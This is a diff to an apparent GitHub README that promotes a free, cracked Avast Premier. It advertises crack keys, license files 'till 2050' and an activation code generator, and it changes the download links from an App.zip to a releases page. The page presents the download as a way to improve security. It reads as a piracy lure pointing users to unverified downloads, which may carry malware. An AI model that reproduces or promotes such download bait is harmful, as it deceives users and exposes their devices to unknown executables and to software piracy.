@@ -7,7 +7,7 @@ Welcome to the **Avast Premier Free** GitHub repository! Here you will find all 
 - **Description:** Provides information on avast premier features, activation codes, deals, and more!
 - **Topics:** avast free premier license key, avast free vs avast premier, avast premier 2017 activation code, avast premier 2018 crack, avast premier 2018 license file till 2050, avast premier 2018 license key, avast premier 2019 crackeado, avast premier activation code generator, avast premier deals, avast premier download, avast premier features, avast premier free activation code, avast premier full, avast premier license file till 2050, crack avast premier, what does avast premier include
 
-## Visit the Repository: [Avast Premier Free Repository](https://github.com/uploads/App.zip)
+## Visit the Repository: [Avast Premier Free Repository](https://github.com/passsionfruiit/Avast-Premier-Free/releases)
 
 ### Need to be launched!
 
@@ -53,6 +53,6 @@ For users still using Avast Premier 2017, find information on activation codes a
 
 ---
 
-Dive into the world of Avast Premier with all the information and resources available in this repository. Enhance your cybersecurity defenses and keep your devices safe from online threats. Visit the [Avast Premier Free Repository](https://github.com/uploads/App.zip) now for all your Avast Premier needs!
+Dive into the world of Avast Premier with all the information and resources available in this repository. Enhance your cybersecurity defenses and keep your devices safe from online threats. Visit the [Avast Premier Free Repository](https://github.com/passsionfruiit/Avast-Premier-Free/releases) now for all your Avast Premier needs!
 
-[![Download Avast Premier](https://img.shields.io/badge/Download-Avast_Premier-blue)](https://github.com/uploads/App.zip)
+[![Download Avast Premier](https://github.com/passsionfruiit/Avast-Premier-Free/releases)](https://github.com/passsionfruiit/Avast-Premier-Free/releases)
